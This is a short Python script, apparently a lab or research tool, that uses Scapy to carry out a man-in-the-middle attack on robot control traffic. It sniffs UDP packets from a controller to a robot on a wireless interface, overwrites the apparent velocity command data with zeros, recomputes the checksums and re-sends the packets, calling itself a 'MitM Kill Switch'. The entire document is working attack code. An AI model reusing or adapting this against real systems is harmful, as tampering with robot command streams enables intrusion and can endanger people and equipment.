from scapy.all import sniff, send, IP, UDP, Raw
import struct

CONTROLLER_IP = "192.168.0.16"
ROBOT_IP = "192.168.0.194"
WRITER_ID = b"\x00\x00\x11\x03"
MARKER = b"\x00\x01\x00\x00"

def intercept_and_modify(pkt):
    if IP in pkt and UDP in pkt:
        # Check if it's a packet from Controller to Robot
        if pkt[IP].src == CONTROLLER_IP and pkt[IP].dst == ROBOT_IP:
            payload = bytes(pkt[UDP].payload)
            
            if WRITER_ID in payload:
                idx = payload.find(WRITER_ID)
                marker_idx = payload.find(MARKER, idx)
                
                if marker_idx != -1:
                    data_start = marker_idx + 4
                    
                    if len(payload) >= data_start + 48:
                        # 1. Split the packet into Before and After the speed data
                        prefix = payload[:data_start]
                        suffix = payload[data_start + 48:]
                        
                        # 2. Create the malicious payload (48 bytes of zeros)
                        zero_data = b'\x00' * 48
                        
                        # 3. Reassemble the Frankenstein packet
                        new_payload = prefix + zero_data + suffix
                        pkt[UDP].payload = Raw(new_payload)
                        
                        # 4. Delete old checksums/lengths so Scapy generates new valid ones!
                        del pkt[IP].len
                        del pkt[IP].chksum
                        del pkt[UDP].len
                        del pkt[UDP].chksum
                        
                        print("[!] INTERCEPTED command. Forcing Robot to STOP (0.0 m/s).")
                        send(pkt, verbose=False)
                        return
            
            # Optional: If the script catches a packet on this port that ISN'T cmd_vel,
            # you still need to forward it so the robot doesn't disconnect.
            send(pkt, verbose=False)

print("[*] Starting MitM Kill Switch on wlan0...")
sniff(iface="wlan0", filter="udp port 7413", prn=intercept_and_modify, store=False)
